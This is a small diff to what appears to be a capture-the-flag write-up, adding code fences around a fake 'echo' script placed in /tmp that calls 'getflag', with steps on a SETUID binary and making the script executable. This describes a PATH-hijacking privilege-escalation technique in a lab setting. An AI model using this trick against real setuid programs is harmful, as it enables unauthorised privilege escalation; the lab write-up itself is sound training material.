@@ -7,9 +7,11 @@
 4. Bonus info: executable is owned by flag03 and has SETUID (-rwsr-sr-x 1 flag03 level03 8627 level03) == it is executed with flag03's permissions
 
 5. Create a fake 'echo' in /tmp:
+```
 #!/bin/sh
 
 getflag
+```
 
 6. make /tmp/echo executable with `chmod +x /tmp/echo`
 
